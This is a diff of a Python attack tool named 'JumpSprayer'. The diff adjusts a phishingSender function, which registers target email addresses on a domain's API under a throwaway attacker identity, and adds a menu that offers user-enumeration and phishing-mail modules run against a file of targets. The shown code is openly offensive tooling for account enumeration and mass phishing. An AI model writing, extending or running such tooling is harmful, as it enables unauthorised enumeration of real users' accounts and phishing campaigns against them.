@@ -1,4 +1,4 @@
-import requests,sys,json,threading,os
+import requests,sys,json,os
 from dotenv import load_dotenv
 
 #load virtual env
@@ -63,7 +63,7 @@ def phishingSender(usersList):
         #HTTP request payload
         data = {
             "username":"durandas",          #random name to register on the domain
-            "firstname":user.split('.')[0], #take user in format firstname.lastname@domain.tld
+            "firstname":user.split('@')[0], #take user in format firstname.lastname@domain.tld
             "email":"dur4ndal@1337.lol"     #random email to register on the domain
         }
         req = requests.post(apiURL,headers=headers,json=data)
@@ -82,7 +82,18 @@ def phishingSender(usersList):
             sys.exit("An error occurred while user register.")
 
 
-
-size = get_file_size_by_lines(sys.argv[1])
-#print(size)
-reader(sys.argv[1],0,size)
+if __name__ == "__main__":
+    module = input('JumpSprayer by dur4ndal\nMade with l0v3.\n\n------------------------------------------------------------------------\n\nModule:\n   -UE - User Enumeration.\n   -SM - Send Mail.\nHelp:\n   -h - Show Help message.\n').strip()
+    match module:
+        case '':    
+            sys.exit("Usage: python3 jumpdestroyer.py <file>")
+        case '-h':
+            sys.exit("You know what the README is for, right?")
+        case '-UE':
+            size = get_file_size_by_lines(sys.argv[1])
+            print('------------------------------------------------------------------------')
+            senderEnumeration(reader(sys.argv[1],0,size))
+        case '-SM':
+            size = get_file_size_by_lines(sys.argv[1])
+            print('------------------------------------------------------------------------')
+            phishingSender(reader(sys.argv[1],0,size))
